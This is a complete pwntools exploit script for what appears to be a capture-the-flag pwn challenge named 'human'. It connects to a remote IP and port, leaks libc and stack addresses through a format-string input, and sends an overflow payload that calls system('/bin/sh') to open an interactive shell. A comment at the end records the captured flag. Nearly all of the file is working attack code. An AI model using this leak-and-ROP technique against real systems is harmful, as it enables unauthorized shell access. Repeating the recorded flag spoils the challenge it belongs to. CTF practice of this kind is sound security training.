# -*- coding:utf-8 -*-
from pwn import *
context.log_level = "debug"
local = False
if local:
	p = process("./human")
	#gdb.attach(p)
else:
	p = remote("114.116.54.89","10005")

libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

elf = ELF("./human")
p.recv(timeout=1)
p.sendline("%4$p%p")
offset = 0x5d0700+0x1d000
libc.address = int(p.recv(numb=14),16)-offset
stack_addr = int(p.recv(numb=14),16)+0x20
success(hex(libc.address))
success(hex(stack_addr))
p.recvuntil("人类还有什么本质?\n")
c1 = "真香鸽子"
payload = c1
payload = payload.ljust(0x20,"\x00")
payload += "/bin/sh\x00"
payload += p64(0x400933)
payload += p64(stack_addr)
payload += p64(libc.symbols['system'])
p.send(payload)
#p.recvuntil("鸽子\n")
#read_addr = u64(p.recv(numb=0x6).ljust(0x8,"\x00"))
#success(hex(read_addr))
#success(hex(read_addr))
#success(hex(read_addr-libc.symbols['read']))
p.interactive()
#flag{as67sdf834ht98e7sdyf9348yf0y}
